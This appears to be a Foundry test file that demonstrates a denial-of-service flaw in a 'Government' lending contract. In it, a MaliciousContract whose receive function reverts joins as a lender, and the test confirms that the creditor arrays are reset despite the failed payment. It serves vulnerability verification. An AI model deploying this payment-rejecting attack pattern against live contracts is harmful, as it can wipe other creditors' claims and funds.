// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/list_dos.sol";

contract GovernmentTest is Test {
    Government public government;
    address constant DEPLOYER = address(0x123);
    address constant NORMAL_CREDITOR = address(0x456);

    MaliciousContract public maliciousContract;

    function setUp() public {
        vm.deal(DEPLOYER, 1 ether);
        vm.prank(DEPLOYER);
        government = new Government{value: 1 ether}();

        vm.deal(NORMAL_CREDITOR, 1 ether);
        vm.prank(NORMAL_CREDITOR);
        government.lendGovernmentMoney{value: 1 ether}(address(0));

        vm.warp(block.timestamp + 12 hours + 1);

        maliciousContract = new MaliciousContract(government);
        vm.deal(address(maliciousContract), 1 ether);
    }

    function test_MissingSendCheck() public {
        assertEq(government.getCreditorAddresses().length, 1, "Creditor not added");
        
        console.log("--- BEFORE-Trigger State ---");
        (   
            uint256 creditorAddressesLengthBefore, 
            uint256 creditorAmountsLengthBefore, 
            uint256 roundBefore, 
            uint256 profitFromCrashBefore, 
            uint256 lastCreditorPayedOutBefore
        ) = _getGovernmentState();
        
        console.log("CreditorAddresses.length (before):", creditorAddressesLengthBefore);
        console.log("CreditorAmounts.length (before):", creditorAmountsLengthBefore);
        console.log("Round (before):", roundBefore);
        console.log("ProfitFromCrash (before):", profitFromCrashBefore);
        console.log("LastCreditorPayedOut (before):", lastCreditorPayedOutBefore);

        console.log("--- Trigger Attack ---");
        vm.prank(address(maliciousContract));
        maliciousContract.attack();
        
        console.log("--- AFTER-Trigger State ---");
        (   
            uint256 creditorAddressesLengthAfter, 
            uint256 creditorAmountsLengthAfter, 
            uint256 roundAfter, 
            uint256 profitFromCrashAfter, 
            uint256 lastCreditorPayedOutAfter
        ) = _getGovernmentState();
        
        console.log("CreditorAddresses.length (after):", creditorAddressesLengthAfter);
        console.log("CreditorAmounts.length (after):", creditorAmountsLengthAfter);
        console.log("Round (after):", roundAfter);
        console.log("ProfitFromCrash (after):", profitFromCrashAfter);
        console.log("LastCreditorPayedOut (after):", lastCreditorPayedOutAfter);

        // Run existing assertions
        assertEq(government.getCreditorAddresses().length, 0, "Reset state despite failed send");
        assertEq(address(maliciousContract).balance, 0, "Malicious contract balance should be 0");

        // Differential verification logic
        if (creditorAddressesLengthAfter == 0 && creditorAmountsLengthAfter == 0) {
            console.log("Verdict: Creditor arrays were reset to 0 despite failed payment");
            console.log("Vulnerability Exists: DoS implemented through array reset");
        } else {
            console.log("Verdict: Creditor arrays were not reset to 0");
            console.log("Vulnerability not Exist: No state reset detected");
        }
    }

    function _getGovernmentState() internal view returns (
        uint256 creditorAddressesLength,
        uint256 creditorAmountsLength,
        uint256 round,
        uint256 profitFromCrash,
        uint256 lastCreditorPayedOut
    ) {
        return (
            government.getCreditorAddresses().length,
            government.getCreditorAmounts().length,
            government.round(),
            government.profitFromCrash(),
            government.lastCreditorPayedOut()
        );
    }
}

contract MaliciousContract {
    Government public gov;

    constructor(Government _gov) {
        gov = _gov;
    }

    function attack() public {
        gov.lendGovernmentMoney{value: 1 ether}(address(0));
    }

    receive() external payable {
        revert("Malicious contract rejects payments");
    }
}